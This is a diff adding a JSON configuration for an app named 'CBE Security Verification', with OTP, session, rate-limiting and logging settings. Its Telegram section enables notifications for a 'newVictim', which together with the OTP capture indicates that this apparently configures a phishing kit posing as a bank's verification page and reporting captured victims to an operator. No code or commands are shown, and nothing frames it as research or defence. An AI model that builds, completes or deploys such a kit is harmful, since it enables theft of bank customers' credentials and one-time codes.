@@ -1,0 +1,40 @@
+{
+  "app": {
+    "name": "CBE Security Verification",
+    "version": "1.0.0",
+    "environment": "production"
+  },
+  "security": {
+    "encryption": {
+      "algorithm": "aes-256-cbc",
+      "keyDerivation": "pbkdf2"
+    },
+    "session": {
+      "maxAge": 3600000,
+      "secure": true
+    }
+  },
+  "features": {
+    "otp": {
+      "length": 6,
+      "expirySeconds": 300
+    },
+    "rateLimiting": {
+      "enabled": true,
+      "maxAttempts": 3
+    }
+  },
+  "telegram": {
+    "enabled": true,
+    "notifications": {
+      "newVictim": true,
+      "failedAttempts": true,
+      "ipBlocked": true
+    }
+  },
+  "logging": {
+    "level": "info",
+    "maxFiles": 5,
+    "maxSize": "10m"
+  }
+}
